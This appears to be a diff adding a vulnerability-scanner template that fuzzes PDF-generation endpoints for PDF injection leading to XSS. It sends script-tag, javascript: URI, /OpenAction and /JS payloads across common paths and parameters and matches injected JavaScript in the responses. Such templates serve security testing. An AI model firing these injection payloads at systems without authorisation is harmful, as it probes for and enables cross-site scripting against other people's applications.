@@ -1,0 +1,226 @@
+id: medium-webapp-pdf-injection-xss-via-pdf
+
+info:
+  name: PDF Injection Leading to XSS
+  author: elite-red-team
+  severity: high
+  description: |
+    Detects PDF injection vulnerabilities where user input is embedded into PDF documents
+    without proper sanitization. When PDFs are viewed in browsers or PDF viewers that
+    support JavaScript, this can lead to XSS attacks and information disclosure.
+  reference:
+    - https://blog.doyensec.com/2014/01/10/pdf-xss.html
+    - https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/reflected-file-download-a-new-web-attack-vector/
+    - https://insert-script.blogspot.com/2014/12/pdf-based-polymorphic-xss-attack.html
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
+    cvss-score: 6.1
+    cwe-id: CWE-79
+  tags: pdf-injection,xss,file-generation,medium
+
+http:
+  - raw:
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        {{param}}=<script>alert('PDF_XSS_TEST')</script>&{{param2}}=test
+
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        {{param}}=javascript:alert('PDF_JS_TEST')&{{param2}}=test
+
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        
+        {"{{param}}": "/S /URI (javascript:alert('PDF_URI_TEST'))", "{{param2}}": "test"}
+
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        
+        {"{{param}}": "/JS (this.print({bUI:true,bSilent:false,bShrinkToFit:true});)", "{{param2}}": "test"}
+
+      - |
+        GET {{path}}?{{param}}=%3Cscript%3Ealert%28%27PDF_GET_XSS%27%29%3C%2Fscript%3E&{{param2}}=test HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        {{param}}=/OpenAction<</S/JavaScript/JS(app.alert('PDF_OPENACTION_TEST'))>>&{{param2}}=test
+
+    payloads:
+      path:
+        - "/pdf"
+        - "/generate"
+        - "/report"
+        - "/invoice"
+        - "/document"
+        - "/export/pdf"
+        - "/api/pdf"
+        - "/admin/pdf"
+        - "/user/pdf"
+        - "/reports/pdf"
+        - "/download/pdf"
+        - "/print"
+
+      param:
+        - "title"
+        - "name"
+        - "content"
+        - "description"
+        - "text"
+        - "message"
+        - "comment"
+        - "subject"
+        - "author"
+        - "data"
+
+      param2:
+        - "format"
+        - "type"
+        - "id"
+        - "template"
+
+    attack: clusterbomb
+    threads: 12
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+          - 302
+
+      - type: word
+        words:
+          - "application/pdf"
+          - "Content-Type: application/pdf"
+        part: header
+        condition: or
+
+      - type: word
+        words:
+          - "%PDF-"
+          - "PDF"
+        part: body
+        condition: or
+
+    extractors:
+      - type: regex
+        name: pdf_header
+        part: body
+        regex:
+          - '%PDF-[0-9]\.[0-9]'
+
+      - type: regex
+        name: javascript_in_pdf
+        part: body
+        regex:
+          - '(?i)/JavaScript'
+          - '(?i)/JS\s*\('
+          - '(?i)alert\('
+          - '(?i)this\.print'
+
+      - type: kval
+        kval:
+          - content_type
+          - content_disposition
+
+# Additional test for direct PDF endpoints
+  - raw:
+      - |
+        GET {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/pdf,*/*
+
+    payloads:
+      path:
+        - "/report.pdf"
+        - "/invoice.pdf"
+        - "/document.pdf"
+        - "/file.pdf"
+        - "/export.pdf"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "application/pdf"
+        part: header
+
+      - type: word
+        words:
+          - "%PDF-"
+        part: body
+
+    extractors:
+      - type: regex
+        name: pdf_version
+        part: body
+        regex:
+          - '%PDF-([0-9]\.[0-9])'
+
+      - type: regex
+        name: pdf_objects
+        part: body
+        regex:
+          - '(?i)(/JavaScript|/JS|/OpenAction|/URI)'
+
+# Test for PDF generation with parameters
+  - raw:
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
+        
+        ------WebKitFormBoundary7MA4YWxkTrZu0gW
+        Content-Disposition: form-data; name="{{param}}"
+        
+        <script>alert('PDF_MULTIPART_XSS')</script>
+        ------WebKitFormBoundary7MA4YWxkTrZu0gW--
+
+    payloads:
+      path:
+        - "/generate-pdf"
+        - "/create-pdf"
+        - "/pdf-generator"
+
+      param:
+        - "content"
+        - "html"
+        - "data"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+
+      - type: word
+        words:
+          - "application/pdf"
+        part: header
+
+    extractors:
+      - type: regex
+        name: injected_content
+        part: body
+        regex:
+          - '(?i)(alert|script|javascript)'
